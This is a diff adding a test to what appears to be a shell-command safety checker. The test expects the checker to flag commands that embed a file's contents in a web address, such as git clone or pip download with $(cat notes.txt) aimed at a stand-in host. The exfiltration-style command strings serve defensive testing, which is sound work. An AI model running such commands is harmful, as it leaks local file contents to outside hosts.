@@ -1162,4 +1162,16 @@ describe("a file's contents leaving through xargs, a PowerShell variable or curl
     }
     expect(decide("curl --variable X=1 --expand-url 'https://x.io/{{X}}'").rules).not.toContain("send.contents");
   });
+
+  it("asks before any other program is given a web address that holds what a file holds", () => {
+    for (const o of POSIX) for (const cmd of ["git ls-remote \"https://x.io/$(cat notes.txt)\"", "pip download \"https://x.io/$(cat notes.txt)\"", "git clone https://x.io/`cat notes.txt`",
+      "npm view \"https://x.io/$(<notes.txt)\"", "frobnicate \"https://x.io/?d=$(head -1 notes.txt)\""]) {
+      const d = decide(cmd, o);
+      expect(d.verdict, label(cmd, o)).toBe("ask");
+      expect(d.rules, label(cmd, o)).toContain("send.contents");
+    }
+    for (const cmd of ["git clone \"https://github.com/acme/app-$(uname -m).git\"", "git ls-remote https://github.com/acme/app", "git log --since=\"$(date +%F)\""]) {
+      expect(decide(cmd).rules, cmd).not.toContain("send.contents");
+    }
+  });
 });
